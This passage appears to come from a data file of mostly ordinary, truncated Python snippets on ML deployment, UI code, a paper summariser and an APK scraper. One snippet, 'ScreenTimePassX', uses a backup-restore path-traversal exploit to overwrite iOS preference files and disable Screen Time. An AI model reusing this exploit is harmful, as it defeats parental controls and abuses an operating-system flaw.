dict_setitem=dict.__setitem__, proxy=_proxy, Link=_Link):\n        'od.__setitem__(i, y) <==> od[i]=y'\n        # Setting a new item creates a new link at the end of the linked list,\n        # and the inherited dictionary is updated with the new key/value pair.\n        if key not in self:\n            self.__map[key] = link = Link()\n            root = self.__root\n            last = root.prev\n            link.prev, link.next, link.key = last, root, key\n            last.next = link\n            root.prev = proxy(link)\n        dict_setitem(self, key, value)\n\n    def __delitem__(self, key, dict_delitem=dict.__delitem__):\n        'od.__delitem__(y) <==> del od[y]'\n        # Deleting an existing item uses self.__map to find the link which gets\n        # removed by updating the links in the predecessor and successor nodes.\n        dict_delitem(self, key)\n        link = self.__map.pop(key)\n        link_prev = link.prev\n        link_next = link.next\n        link_prev.next = link_next\n        link_next.prev = link_prev\n        link.prev = None\n        link.next = None\n\n    def __iter__(self):\n        'od.__iter__()",
    "import time\nfrom typing import Dict, Optional, Sequence, Union\n\nimport tensorrt as trt\nimport torch\nimport torch.onnx\nfrom mmcv import Config\nfrom mmdeploy.backend.tensorrt import load_tensorrt_plugin\n\ntry:\n    # If mmdet version > 2.23.0, compat_cfg would be imported and\n    # used from mmdet instead of mmdet3d.\n    from mmdet.utils import compat_cfg\nexcept ImportError:\n    from mmdet3d.utils import compat_cfg\n\nimport argparse\n\nfrom mmdet3d.core import bbox3d2result\nfrom mmdet3d.core.bbox.structures.box_3d_mode import LiDARInstance3DBoxes\nfrom mmdet3d.datasets import build_dataloader, build_dataset\nfrom mmdet3d.models import build_model\nfrom tqdm import tqdm\n\n\ndef parse_args():\n    parser = argparse.ArgumentParser(description='Deploy BEVDet with Tensorrt')\n    parser.add_argument('config', help='deploy config file path')\n    parser.add_argument('engine', help='checkpoint file')\n    parser.add_argument('--samples', default=500, type=int, help='samples to benchmark')\n    parser.add_argument('--postprocessing', action='store_true')\n    parser.add_argument('--eval', action='store_true')\n    parser.add_argument('--prefetch', action='store_true',\n                        help='use prefetch to accelerate the data loading, '\n                             'the inference speed is sightly degenerated due '\n                             'to the computational occupancy of prefetch')\n    args = parser.parse_args()\n    return args\n\n\ndef torch_dtype_from_trt(dtype: trt.DataType) -> torch.dtype:\n    \"\"\"Convert pytorch dtype to TensorRT dtype.\n\n    Args:\n        dtype (str.DataType): The data type in tensorrt.\n\n    Returns:\n        torch.dtype: The corresponding data type in torch.\n    \"\"\"\n\n    if dtype == trt.bool:\n        return torch.bool\n    elif dtype == trt.int8:\n        return torch.int8\n    elif dtype == trt.int32:\n        return torch.int32\n    elif dtype == trt.float16:\n        return torch.float16\n    elif dtype == trt.float32:\n        return torch.float32\n    else:\n        raise TypeError(f'{dtype} is not supported by torch')\n\n\nclass TRTWrapper(torch.nn.Module):\n\n    def __init__(self,\n                 engine: Union[str, trt.ICudaEngine],\n                 output_names: Optional[Sequence[str]] = None) -> None:\n        super().__init__()\n        self.engine = engine\n        if isinstance(self.engine, str):\n            with trt.Logger() as logger, trt.Runtime(logger) as runtime:\n                with open(self.engine, mode='rb') as f:\n                    engine_bytes = f.read()\n                self.engine = runtime.deserialize_cuda_engine(engine_bytes)\n        self.context = self.engine.create_execution_context()\n        names = [_ for _ in self.engine]\n        input_names = list(filter(self.engine.binding_is_input, names))\n        self._input_names = input_names\n        self._output_names = output_names\n\n        if self._output_names is None:\n            output_names = list(set(names) - set(input_names))\n            self._output_names = output_names\n\n    def forward(self, inputs: Dict[str, torch.Tensor]):\n        bindings = [None] * (len(self._input_names) + len(self._output_names))\n        for input_name, input_tensor in inputs.items():\n            idx = self.engine.get_binding_index(input_name)\n            self.context.set_binding_shape(idx, tuple(input_tensor.shape))\n            bindings[idx] = input_tensor.contiguous().data_ptr()\n\n            # create output tensors\n        outputs = {}\n        for output_name in self._output_names:\n            idx = self.engine.get_binding_index(output_name)\n            dtype = torch_dtype_from_trt(self.engine.get_binding_dtype(idx))\n            shape = tuple(self.context.get_binding_shape(idx))\n\n            device = torch.device('cuda')\n            output = torch.zeros(size=shape, dtype=dtype, device=device)\n            outputs[output_name] = output\n            bindings[idx] = output.data_ptr()\n        self.context.execute_async_v2(bindings,\n                                      torch.cuda.current_stream().cuda_stream)\n        return outputs\n\n\ndef get_plugin_names():\n    return [pc.name for pc in trt.get_plugin_registry().plugin_creator_list]\n\n\ndef main():\n\n    load_tensorrt_plugin()\n\n    args = parse_args()\n\n    if args.eval:\n        args.postprocessing=True\n        print('Warnings: evaluation requirement detected, set '\n              'postprocessing=True for evaluation purpose')\n    cfg = Config.fromfile(args.config)\n    cfg.model.pretrained = None\n    cfg.model.type = cfg.model.type + 'TRT'\n    cfg = compat_cfg(cfg)\n    cfg.gpu_ids = [0]\n\n    if not args.prefetch:\n        cfg.data.test_dataloader.workers_per_gpu=0\n\n    # build dataloader\n    assert cfg.data.test.test_mode\n    test_dataloader_default_args = dict(\n        samples_per_gpu=1, workers_per_gpu=2, dist=False, shuffle=False)\n    test_loader_cfg = {\n        **test_dataloader_default_args,\n        **cfg.data.get('test_dataloader', {})\n    }\n    dataset = build_dataset(cfg.data.test)\n    data_loader = build_dataloader(d",
    "\"\"\"Status display service for G1 glasses\"\"\"\nimport asyncio\nimport time\nfrom rich.table import Table\nfrom rich.live import Live\nfrom rich.text import Text\n\nfrom utils.constants import StateEvent, EventCategories\n\nclass StatusManager:\n    \"\"\"Manages status display and dashboard\"\"\"\n    \n    def __init__(self, connector):\n        self.connector = connector\n        self.logger = connector.logger\n        self._live = None\n        self._running = False\n        \n    def generate_table(self) -> Table:\n        \"\"\"Generate status table for display\"\"\"\n        table = Table(title=\"G1 Glasses Status\")\n        \n        # Add columns first for consistent layout\n        table.add_column(\"Device\", style=\"cyan\")\n        table.add_column(\"Status\", style=\"green\")\n        table.add_column(\"Signal\", style=\"yellow\")\n        table.add_column(\"Errors\", style=\"red\")\n\n        # Connection Status Section\n        self._add_connection_status(table)\n        \n        # Device State Section\n        self._add_device_states(table)\n        \n        # Event Status Section\n        self._add_event_status(table)\n        \n        # System Status Section\n        self._add_system_status(table)\n        \n        return table\n\n    def _add_connection_status(self, table: Table):\n        \"\"\"Add connection status information\"\"\"\n        # Left glass status\n        left_rssi = self.connector._connection_quality['left']['rssi']\n        left_errors = self.connector._connection_quality['left']['errors']\n        table.add_row(\n            f\"Left Glass ({self.connector.config.left_name or 'Not Found'})\",\n            \"Connected\" if self.connector.left_client and self.connector.left_client.is_connected else \"Disconnected\",\n            f\"{left_rssi}dBm\" if left_rssi else \"N/A\",\n            str(left_errors)\n        )\n        \n        # Right glass status\n        right_rssi = self.connector._connection_quality['right']['rssi']\n        right_errors = self.connector._connection_quality['right']['errors']\n        table.add_row(\n            f\"Right Glass ({self.connector.config.right_name or 'Not Found'})\",\n            \"Connected\" if self.connector.right_client and self.connector.right_client.is_connected else \"Disconnected\",\n            f\"{right_rssi}dBm\" if right_rssi else \"N/A\",\n            str(right_errors)\n        )\n\n    def _add_device_states(self, table: Table):\n        \"\"\"Add device state information\"\"\"\n        # Physical State - use both state manager and event service\n        physical_state = self.connector.state_manager.physical_state\n        event_state = self._get_last_event_of_type(StateEvent.PHYSICAL_STATES)\n        table.add_row(\n            \"Physical State\",\n            f\"{physical_state} ({event_state})\" if event_state else physical_state,\n            \"\",\n            \"\"\n        )\n\n        # Device State\n        device_state = self._get_last_event_of_type(StateEvent.DEVICE_STATES)\n        if device_state:\n            table.add_row(\"Device State\", device_state, \"\", \"\")\n            \n        # Battery State - Added\n        battery_state = self.connector.state_manager.battery_state\n        if battery_state:\n            table.add_row(\"Battery State\", battery_state, \"\", \"\")\n            \n        # AI Status\n        table.add_row(\n            \"AI Status\",\n            \"Enabled\" if self.connector.event_service._ai_enabled else \"Disabled\",\n            \"\",\n            \"\"\n        )\n        \n        # Silent Mode\n        table.add_row(\n            \"Silent Mode\",\n            \"On\" if self.connector.event_service._silent_mode else \"Off\",\n            \"\",\n            \"\"\n        )\n\n    def _add_event_status(self, table: Table):\n        \"\"\"Add recent event information\"\"\"\n        # Last Interaction - use both state manager and event service\n        interaction = self.connector.state_manager.last_interaction\n        if interaction and interaction != \"None\":\n            table.add_row(\n                \"Last Interaction\",\n                interaction,\n                \"\",\n                \"\"\n            )\n        \n        # Last Heartbeat\n        last_heartbeat = self.connector.event_service.last_heartbeat\n        if last_heartbeat:\n            time_ago = time.time() - last_heartbeat\n            table.add_row(\n                \"Last Heartbeat\",\n                f\"{time_ago:.1f}s ago\",\n                \"\",\n                \"\"\n            )\n\n    def _add_system_status(self, table: Table):\n        \"\"\"Add system status information\"\"\"\n        table.add_section()\n        \n        # Connection State\n        table.add_row(\n            \"Connection\",\n            self.connector.state_manager.connection_state,\n            \"\",\n            \"\"\n        )\n        \n        # Add any error counts or system messages\n        error_count = sum(side['errors'] for side in self.connector._connection_quality.values())\n        if error_count > 0:\n            table.add_row(\n                \"Total Errors\",\n                str(error_count),\n                \"\",\n                \"\"\n            )\n\n    def _get_last_event",
    "from pathlib import Path\nimport plistlib\nfrom pymobiledevice3.cli.cli_common import Command\nfrom pymobiledevice3.exceptions import NoDeviceConnectedError, PyMobileDevice3Exception\nfrom pymobiledevice3.lockdown import LockdownClient\nfrom pymobiledevice3.services.diagnostics import DiagnosticsService\nfrom pymobiledevice3.services.installation_proxy import InstallationProxyService\nfrom sparserestore import backup, perform_restore\n\nscreentime_plist = \"ScreenTimeAgent.plist\"\ndisabled_plist = \"disabled.plist\"\nmodifyplist = dict(\"com.apple.ScreenTimeAgent\": True, \"com.apple.homed\": True, \"com.apple.familycircled\": True)\n\ndef main():\n    print(\"ScreenTimePassX v1, by connor walsh (dumbButSkilledDev)\")\n    print(\"creating custom backup....\")\n    print(\"[custom backup] setting screenTimeAgent.plist to empty contents, and disabling all screen time services...\")\n    back = backup.Backup(\n        files=[\n            backup.Directory(\"\", \"RootDomain\"),\n            backup.Directory(\n                \"\",\n                \"SysContainerDomain-../../../../../../../../var/backup/var/mobile/Library/Preferences\",\n                owner=33,\n                group=33,\n            ),\n            backup.ConcreteFile(\n                \"\",\n                f\"SysContainerDomain-../../../../../../../../var/backup/var/mobile/Library/Preferences/{screentime_plist}\",\n                owner=33,\n                group=33,\n                contents=b\"\",\n                inode=0,\n            ),\n            backup.Directory(\n                \"\",\n                \"SysContainerDomain-../../../../../../../../var/backup/var/db/com/apple.xpc.launchd/\",\n                owner=33,\n                group=33,\n            ),\n            backup.ConcreteFile(\n                \"\",\n                f\"SysContainerDomain-../../../../../../../../var/backup/var/mobile/Library/Preferences/{disabled_plist}\",\n                owner=33,\n                group=33,\n                contents=plistlib.dumps(modifyplist),\n                inode=0,\n            ),\n        ]\n    )\n\n    print(\"I AM NOT RESPONSIABLE FOR ANY DAMGE TO YOUR DEVICE, THOUGH EXTREAMLY UNLIKELY. IF YOU ARE IN A BOOTLOOP, RESTORE WITH ITUNES, THOUGH THIS WILL PROBALLY NOT HAPPEN.\")\n    w = input(\"Plug your device in (make sure u have itunes on windows), disable find my on the device, and press enter to start, ctrl-c to cancel\")\n    print(\"Restoring....\")\n\n    try:\n        perform_restore(back, reboot=False)\n    except PyMobileDevice3Exception as e:\n        if \"Find My\" in str(e):\n            print(\"please disable find my, this tool will exit, then run it again with findmy disabled.\")\n            exit(1)\n        elif \"crash_on_purpose\" not in str(e):\n            raise e",
    "class Lora_Strength_Incrementer:\n    def __init__(self):\n        pass\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"seed\": (\"INT\", {\"default\": 0, \"min\": 0, \"max\": 0xffffffffffffffff, \"step\": 1}),\n\t\t\t\t\"increment_step\": (\"FLOAT\", {\"default\": 0.0, \"min\": -1.0, \"max\": 1.0, \"step\": 0.001}),\n\t\t\t\t\"start_strength\": (\"FLOAT\", {\"default\": 0.0, \"min\": -50.0, \"max\": 50.0, \"step\": 0.01}),\n\t\t\t\t#\"stop_at_strength\": (\"FLOAT\", {\"default\": 5.0, \"min\": -50.0, \"max\": 50.0, \"step\": 0.01}), #idk how to do this \n            },\n        }\n\n    RETURN_TYPES = (\"FLOAT\", \"STRING\") \n    FUNCTION = \"increment_strength\"\n    CATEGORY = \"Right click lora loader and convert widget to input. Set control to increment. Start at seed = 0\"\n    \n    def increment_strength(self, seed=0, increment_step=0.0, start_strength=0.0):#, stop_at_strength=0.0):  \n\n        output = start_strength + seed * increment_step \n        return (float(output), str(output))\n\nNODE_CLASS_MAPPINGS = {\n    \"Lora Strength Incrementer\": Lora_Strength_Incrementer,\n}\nNODE_DISPLAY_NAME_MAPPINGS = {\n    \"Lora Strength Incrementer\": \"Lora Strength Incrementer\",\n}",
    "import cv2\r\nimport numpy as np\r\nimport mss\r\nimport time\r\nimport win32api\r\nimport win32con\r\nimport tkinter as tk\r\nimport json\r\nimport threading\r\nimport os\r\nfrom tkinter import font\r\nimport sys\r\nfrom concurrent.futures import ThreadPoolExecutor\r\nimport keyboard\r\nfrom PIL import Image\r\nimport io\r\n\r\ndef resource_path(relative_path):\r\n    if hasattr(sys, '_MEIPASS'):\r\n        # \u83b7\u53d6\u6253\u5305\u65f6\u7684\u4e34\u65f6\u76ee\u5f55\u8def\u5f84\r\n        return os.path.join(sys._MEIPASS, relative_path)\r\n    return os.path.join(os.path.abspath(\".\"), relative_path)\r\n\r\nclass ScreenCapture:\r\n    def __init__(self):\r\n        self.root1 = tk.Tk()\r\n        self.start_x = None\r\n        self.start_y = None\r\n        self.rect_id = None\r\n        self.roi = None\r\n\r\n        # \u521b\u5efa\u5168\u5c4f\u900f\u660e\u7a97\u53e3\r\n        self.root1.attributes(\"-fullscreen\", True)\r\n        self.root1.attributes(\"-alpha\", 0.3)\r\n        self.root1.configure(bg=\"gray\")\r\n        self.canvas = tk.Canvas(self.root1, cursor=\"cross\")\r\n        self.canvas.pack(fill=tk.BOTH, expand=tk.TRUE)\r\n\r\n        # \u7ed1\u5b9a\u9f20\u6807\u4e8b\u4ef6\r\n        self.canvas.bind(\"<ButtonPress-1>\", self.on_mouse_down)\r\n        self.canvas.bind(\"<B1-Motion>\", self.on_mouse_drag)\r\n        self.canvas.bind(\"<ButtonRelease-1>\", self.on_mouse_up)\r\n\r\n    def on_mouse_down(self, event):\r\n        self.start_x = event.x\r\n        self.start_y = event.y\r\n        self.rect_id = self.canvas.create_rectangle(\r\n            self.start_x, self.start_y, self.start_x, self.start_y,\r\n            outline=\"red\", width=2\r\n        )\r\n\r\n    def on_mouse_drag(self, event):\r\n        self.canvas.coords(self.rect_id, self.start_x, self.start_y, event.x, event.y)\r\n\r\n    def on_mouse_up(self, event):\r\n        end_x, end_y = event.x, event.y\r\n        self.roi = {\r\n            \"top\": min(self.start_y, end_y),\r\n            \"left\": min(self.start_x, end_x),\r\n            \"width\": abs(self.start_x - end_x),\r\n            \"height\": abs(self.start_y - end_y)\r\n        }\r\n        self.root1.destroy()\r\n\r\n    def run(self):\r\n        self.root1.mainloop()\r\n        return self.roi\r\n\r\ndef create_capture_gui():\r\n    global captured\r\n    global roi\r\n    window=tk.Tk()\r\n    window.iconbitmap(resource_path('image/avatar.ico'))\r\n    window.title(\"\u8bf7\u622a\u56fe\")\r\n    window.geometry(\"200x100\")\r\n    window.attributes('-topmost', 1)\r\n    def capture_screenshot():\r\n        def run_capture():\r\n            global captured\r\n            global roi\r\n            capture = ScreenCapture()\r\n            roi = capture.run()\r\n            captured = True\r\n            window.after(100,window.destroy)\r\n        threading.Thread(target=run_capture).start()\r\n    capture_button = tk.Button(window, text=\"\u622a\u5c4f\u9009\u62e9\u724c\u5e93\", command=capture_screenshot)\r\n    capture_button.pack(pady=20)\r\n    window.mainloop()\r\n\r\n\r\n\r\n\r\n\r\n# \u52a0\u8f7d\u6240\u6709\u82f1\u96c4\u6a21\u677f\r\ndef load_all_heroes():\r\n    with open(TEMPLATES_FILE, \"r\",encoding='utf-8') as file:\r\n        templates = json.load(file)\r\n    all_heroes = {}\r\n    for stage, heroes in templates.items():\r\n        all_heroes[stage]=heroes\r\n    return all_heroes\r\n\r\n# \u82f1\u96c4\u6a21\u677f\u8def\u5f84\r\nTEMPLATES = {}\r\ntemplates_changed = threading.Event()\r\n\r\ndef capture_screen(region):\r\n    with mss.mss() as sct:\r\n        screenshot = sct.grab(region)\r\n        img = np.array(screenshot)\r\n        img_rgb = cv2.cvtColor(img, cv2.COLOR_BGRA2RGB)\r\n        pil_image = Image.fromarray(img_rgb)\r\n\r\n        img_byte_arr = io.BytesIO()\r\n        pil_image.save(img_byte_arr, format=\"PNG\")\r\n        img_byte_arr = img_byte_arr.getvalue()\r\n        return img_byte_arr\r\n\r\ndef match_hero(template_path, screenshot, threshold=0.8):\r\n    template = cv2.imread(template_path, cv2.IMREAD_COLOR)\r\n    if template is None:\r\n        raise ValueError(f\"\u65e0\u6cd5\u52a0\u8f7d\u6a21\u677f\u56fe\u7247\uff1a{template_path}\")\r\n    # \u6a21\u677f\u5339\u914d\r\n    result = cv2.matchTemplate(screenshot, template, cv2.TM_CCOEFF_NORMED)\r\n    _, max_val, _, max_loc = cv2.minMaxLoc(result)\r\n    if max_val > threshold:\r\n        # print(template_path,max_val)\r\n        h, w,_ = template.shape\r\n        matched_image = screenshot[max_loc[1]:max_loc[1] + h, max_loc[0]:max_loc[0] + w]\r\n        max_loc_list=list(max_loc)\r\n        max_loc_list[0]=max_loc[0]+w//2\r\n        max_loc_list[1]=max_loc[1]+h//2\r\n        max_loc=tuple(max_loc_list)\r\n        return max_loc, matched_image\r\n    else:\r\n        return None, None\r\n\r\n\r\n\r\ndef is_greyscale_image(image, threshold=0.8, tolerance=20):\r\n    if image.ndim == 3:\r\n        image=image.astype(np.int16)\r\n        diff_rg = np.abs(image[:, :, 0] - image[:, :, 1])\r\n        diff_gb = np.abs(image[:, :, 1] - image[:, :, 2])\r\n        diff_rb = np.abs(image[:, :, 0] - image[:, :, 2])\r\n        grey_pixels = (diff_rg <= tolerance) & (diff_gb <= tolerance) & (diff_rb <= tolerance)\r\n    else:\r\n        grey_pixels = np.ones(image.shape[:2], dtype=bool)\r\n    grey_pixel_ratio = np.sum(grey_pixels) / grey_pixels.size\r\n    return grey_pixel_ratio >= threshold\r\n\r\ndef click(x, y):\r\n    win32api.SetCursorPos((x, y))\r\n    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0)\r\n    time.sleep(0.01)\r\n    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0)\r\n    time.sleep(0.01)\r\n",
    "# -*- coding: utf-8 -*-\n\n# Form implementation generated from reading ui file 'src/manage_env/ui_files/main_form.ui'\n#\n# Created by: PyQt5 UI code generator 5.15.11\n#\n# WARNING: Any manual changes made to this file will be lost when pyuic5 is\n# run again.  Do not edit this file unless you know what you are doing.\n\n\nfrom PyQt5 import QtCore, QtGui, QtWidgets\n\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        MainWindow.setObjectName(\"MainWindow\")\n        MainWindow.setWindowModality(QtCore.Qt.NonModal)\n        MainWindow.resize(600, 500)\n        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Preferred, QtWidgets.QSizePolicy.Preferred)\n        sizePolicy.setHorizontalStretch(0)\n        sizePolicy.setVerticalStretch(0)\n        sizePolicy.setHeightForWidth(MainWindow.sizePolicy().hasHeightForWidth())\n        MainWindow.setSizePolicy(sizePolicy)\n        MainWindow.setMinimumSize(QtCore.QSize(600, 500))\n        palette = QtGui.QPalette()\n        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)\n        brush = QtGui.QBrush(QtGui.QColor(222, 221, 218))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Button, brush)\n        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Light, brush)\n        brush = QtGui.QBrush(QtGui.QColor(238, 238, 236))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Midlight, brush)\n        brush = QtGui.QBrush(QtGui.QColor(111, 110, 109))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Dark, brush)\n        brush = QtGui.QBrush(QtGui.QColor(148, 147, 145))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Mid, brush)\n        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Text, brush)\n        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.BrightText, brush)\n        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ButtonText, brush)\n        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)\n        brush = QtGui.QBrush(QtGui.QColor(222, 221, 218))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Window, brush)\n        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Shadow, brush)\n        brush = QtGui.QBrush(QtGui.QColor(238, 238, 236))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.AlternateBase, brush)\n        brush = QtGui.QBrush(QtGui.QColor(255, 255, 220))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ToolTipBase, brush)\n        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ToolTipText, brush)\n        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0, 127))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.PlaceholderText, brush)\n        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)\n        brush = QtGui.QBrush(QtGui.QColor(239, 239, 239))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Button, brush)\n        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Light, brush)\n        brush = QtGui.QBrush(QtGui.QColor(202, 202, 202))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Midlight, brush)\n        brush = QtGui.QBrush(QtGui.QColor(159, 159, 159))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Dark, brush)\n        brush = QtGui.QBrush(QtGui.QColor(184, 184, 184))\n        brush.setStyle(QtCore.Qt.SolidPattern)\n        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Mi",
    "import argparse\nfrom .__init__ import name, __version__\nparser = argparse.ArgumentParser(description='Summarize academic papers using Gemini API')\nparser.add_argument('pdf_paths', nargs='+', help='Path(s) to one or more PDF files')\nparser.add_argument('-d', '--output-dir', help='Output directory for intermediate files')\nparser.add_argument('-o', '--output', help='Output file for summary')\nparser.add_argument('-l', '--language', choices=['de', 'en', 'es', 'fr', 'ja', 'ko', 'zh'], default=None, help='Specify the output language')\nparser.add_argument('--version', action='version', version=f'{name} {__version__}')\nargs = parser.parse_args()\n\nimport os\nif os.name == 'nt':  # Check if the system is Windows\n    from glob import glob\n    pdf_paths = []\n    for path in args.pdf_paths:\n        pdf_paths.extend(glob(path))\nelse:\n    pdf_paths = args.pdf_paths\n\npdfs = len(pdf_paths)\nif args.output:\n    if args.output_dir:\n        parser.error(\"Output directory (-d) cannot be specified when an output file (-o) is provided.\")\n    if pdfs > 1:\n        parser.error(\"Output file (-o) cannot be specified when multiple PDF files are provided.\")\n\nfrom dotenv import load_dotenv\nload_dotenv()\n\nimport google.generativeai as genai\ngenai.configure(api_key=os.environ[\"GEMINI_API_KEY\"])\n\nfrom .summarize import summarize\nfrom . import gemini\nfrom .lang import selector\n\nlang_module = selector.init(args.language)\n\nmax_rpm  = 10  # maximum requests per minute\n\nmodel = genai.GenerativeModel(\n    model_name=\"models/gemini-2.0-flash-exp\",\n    generation_config={\n        \"temperature\": 0.5,\n        \"top_p\": 0.95,\n        \"top_k\": 40,\n        \"max_output_tokens\": 8192,\n        \"response_mime_type\": \"text/plain\",\n    },\n    system_instruction=lang_module.system_instruction,\n)\n\ndef main():\n    for i, pdf_path in enumerate(pdf_paths, 1):\n        if i > 1:\n            print()\n        print(f\"==== PDF {i}/{pdfs}: {pdf_path}\")\n        summary, output, stats = summarize(\n            max_rpm, model, lang_module,\n            pdf_path, args.output, args.output_dir,\n            f\"PDF {i}/{pdfs}, \",\n        )\n        with open(output, \"w\", encoding=\"utf-8\") as f:\n            f.write(summary)\n        print(f\"Summary saved: {output}\")\n        print(\"Statistics:\")\n        gemini.show_stats(stats, \"- \")\n",
    "name = \"Spanish\"\n\nsystem_instruction = \"\"\"\nYou are an expert at analyzing and summarizing academic papers.\nPlease use $TeX$ to write mathematical equations.\nPlease only return the results, and do not include any comments.\nUse a formal academic writing style in Spanish.\n\"\"\".strip()\n\nprompts = [\n    (\"# Abstract\", \"Traduce el Abstract al principio del documento al espa\u00f1ol.\"),\n    (\"# Resumen\", \"Resume el documento en una sola oraci\u00f3n en espa\u00f1ol.\"),\n    (\"## Planteamiento del Problema\", \"\u00bfQu\u00e9 problema intenta resolver el documento? Responde en espa\u00f1ol.\"),\n    (\"## Metodolog\u00eda\", \"\u00bfQu\u00e9 metodolog\u00eda propone el documento? Responde en espa\u00f1ol.\"),\n    (\"## Novedad\", \"\u00bfCu\u00e1l es la novedad del documento? Responde en espa\u00f1ol.\"),\n    (\"# Estructura del Documento\", \"\"\"Genera la estructura del documento como un array JSON sin traducir. Ejemplo:\n```json\n[\n  \"1 Introduction\",\n  \"1.1 Background\",\n  \"2 Methods\",\n  \"2.1 Data\",\n  \"2.1.1 Dataset\"\n]\n```\"\"\"),\n]\n\nsprompt = (\"Resume la secci\u00f3n '%s' en espa\u00f1ol.\", \"', '\")\n",
    "from __future__ import annotations\n\nimport sys\nfrom typing import Any\n\nimport requests\n\n\ndef _get_checkin_param() -> Any | None:\n    \"\"\"\n    Fetches the checkin parameter from the APKCombo checkin endpoint.\n\n    Returns:\n        str: The checkin parameter or None if an error occurs.\n    \"\"\"\n    try:\n        response = requests.post('https://apkcombo.com/checkin', timeout=10)\n        response.raise_for_status()\n        return response.text.strip()\n    except requests.exceptions.RequestException as e:\n        print(f\"Error fetching checkin parameter: {e}\")\n        return None\n\n\nclass APKComboInfo:\n    def __init__(self, apkcombo_url: str):\n        self.apkcombo_url = apkcombo_url\n        self.xapk_download_url, self.xapk_version = self._get_xapk_download_url()\n\n    def _get_xapk_download_url(self) -> Any | None:\n        \"\"\"\n        Extracts the XAPK download URL from the APKCombo page.\n\n        Returns:\n            str: The XAPK download URL or None if not found.\n        \"\"\"\n        try:\n            response = requests.get(self.apkcombo_url, timeout=10)\n            response.raise_for_status()\n            html_content = response.text\n\n            # Find XAPK download URL\n            xapk_url_start = html_content.find('<ul class=\"file-list\">')\n            xapk_url_start = html_content.find('href=', xapk_url_start)\n            while xapk_url_start != -1:\n                xapk_url_end = html_content.find('\"', xapk_url_start + len('href=\"'))\n                temp_url = requests.utils.unquote(html_content[xapk_url_start + len('href=\"'):xapk_url_end])\n                if '.xapk' in temp_url:\n                    xapk_download_url = temp_url\n                    break\n                xapk_url_start = html_content.find('href=', xapk_url_end)\n            else:\n                return None # No XAPK found\n\n            # Add checkin parameter to the download URL\n            checkin_param = _get_checkin_param()\n            if checkin_param:\n                xapk_download_url += '&' + checkin_param\n\n            # Get version of app\n            version_string_start = xapk_download_url.find('1.')\n            version_string_end = xapk_download_url.find('_apkcombo.app.xapk')\n            version_string = xapk_download_url[version_string_start:version_string_end]\n\n            return xapk_download_url, version_string\n\n        except requests.exceptions.RequestException as e:\n            print(f\"Error fetching XAPK info: {e}\")\n            return None\n\n# Example usage:\nif __name__ == \"__main__\":\n    apkcombo_url = \"https://apkcombo.app/%E5%AD%A6%E5%9C%92%E3%82%A2%E3%82%A4%E3%83%89%E3%83%AB%E3%83%9E%E3%82%B9%E3%82%BF%E3%83%BC/com.bandainamcoent.idolmaster_gakuen/download/apk\"\n    apk_info = APKComboInfo(apkcombo_url)\n    xapk_url = apk_info.xapk_download_url\n    xapk_version = apk_info.xapk_version\n\n    if xapk_url:\n            print(xapk_version+xapk_url)\n    else:\n        print(\"Failed to retrieve XAPK download URL or XAPK not found.\")",
